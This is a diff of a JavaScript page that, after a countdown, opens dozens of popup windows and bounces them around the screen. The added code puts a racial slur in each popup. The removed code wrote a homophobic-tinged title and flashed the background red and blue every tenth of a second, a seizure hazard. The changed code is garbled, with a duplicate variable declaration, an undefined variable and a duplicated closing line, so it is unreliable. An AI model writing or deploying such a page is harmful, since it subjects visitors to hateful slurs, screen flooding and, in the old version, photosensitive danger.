@@ -30,14 +30,16 @@
             }
         }
 
-        function bounceWindow(popup, width, height) {
+        function bounceWindow(popup) {
             if (!popup) return;
 
             // Initialize position and velocity
-            let left = Math.random() * (window.screen.availWidth - width);
-            let top = Math.random() * (window.screen.availHeight - height);
-            let velocityX = 15; // Horizontal speed
-            let velocityY = 15; // Vertical speed
+            let left = Math.random() * (window.screen.availWidth - 400);
+            let top = Math.random() * (window.screen.availHeight - 300);
+            let velocityX = 13; // Horizontal speed
+            let velocityY = 13; // Vertical speed
+            let velocityX = 9; // Horizontal speed
+            let velocityY = 9; // Vertical speed
 
             const interval = setInterval(() => {
                 // Update position
@@ -45,20 +47,22 @@
                 top += velocityY;
 
                 // Check for collisions with screen edges and reverse direction if needed
-                if (left <= 0 || left >= window.screen.availWidth - width) {
+                if (left <= 0 || left >= window.screen.availWidth - 400) {
                     velocityX *= -1; // Reverse horizontal direction
                 }
-                if (top <= 0 || top >= window.screen.availHeight - height) {
+                if (top <= 0 || top >= window.screen.availHeight - 300) {
                     velocityY *= -1; // Reverse vertical direction
                 }
 
                 // Move the popup
                 try {
+                    popup.moveTo(middle, top);
                     popup.moveTo(left, top);
                 } catch (e) {
                     clearInterval(interval); // Stop movement if popup is inaccessible
                 }
-            }, 30); // Fast bouncing (interval of 30ms)
+            }, 90); // Adjust interval for smoother or faster movement
+            }, 30); // Adjust interval for smoother or faster movement
         }
 
         function startCountdown() {
@@ -69,37 +73,24 @@
                 if (countdownElem) countdownElem.textContent = seconds;
                 if (seconds <= 0) {
                     clearInterval(interval);
-
-                    // Open 100 bouncing windows
-                    for (let i = 0; i < 100; i++) {
+                    for (let i = 0; i < 45; i++) {
                         const popup = window.open(
                             'about:blank',
                             `_blank`,
                             `width=400,height=300,left=0,top=0`
                         );
                         if (popup) {
-                            // Set the title of the popup
-                            popup.document.title = "gay69";
-
-                            // Write flashing lights content
                             popup.document.write(`
                                 <html>
-                                    <head><title>gay69</title></head>
-                                    <body style="margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background-color:red;">
+                                    <body style="display:flex;justify-content:center;align-items:center;height:100vh;">
+                                        <h2>niggers</h2>
                                         <script>
-                                            let isRed = true;
-                                            setInterval(() => {
-                                                document.body.style.backgroundColor = isRed ? 'blue' : 'red';
-                                                isRed = !isRed;
-                                            }, 100); // Flash every 0.1 seconds
-                                            setTimeout(() => { window.close(); }, 30000); // Close after 30 seconds
+                                            setTimeout(function() { window.close(); }, 30000);
                                         <\/script>
                                     </body>
                                 </html>
                             `);
-
-                            // Start bouncing the window
-                            bounceWindow(popup, 400, 300);
+                            bounceWindow(popup); // Start bouncing the window
                         }
                     }
                 }
